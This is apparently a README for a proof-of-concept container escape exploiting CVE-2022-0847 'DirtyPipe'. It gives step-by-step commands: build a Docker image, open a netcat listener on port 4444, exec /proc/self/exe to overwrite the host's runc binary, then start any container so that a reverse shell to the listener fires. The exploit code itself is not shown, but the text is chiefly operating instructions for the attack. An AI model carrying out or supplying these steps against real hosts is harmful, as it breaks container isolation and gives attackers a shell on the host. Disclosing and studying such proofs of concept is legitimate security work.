# DirtyPipe PoC
Container Escape PoC for CVE-2022-0847 "DirtyPipe"

## Usage
1. Build
```
$ docker build -t dirtypipe .
$ docker run --name dirtypipe -it dirtypipe
```

2. Start listener in another terminal:
`$ nc -nlvp 4444`

3. In yet another terminal (may need to be repeated a few times):
```
$ docker exec -it dirtypipe /proc/self/exe
```

4. Once runc is overwritten, run any container (or exec again). Reverse shell should be triggered.
```
$ docker run -it ubuntu:latest
```

## Screenshots
![image](https://user-images.githubusercontent.com/85519958/157522451-6b26a3a2-950c-4350-aa37-35987b7d4199.png)
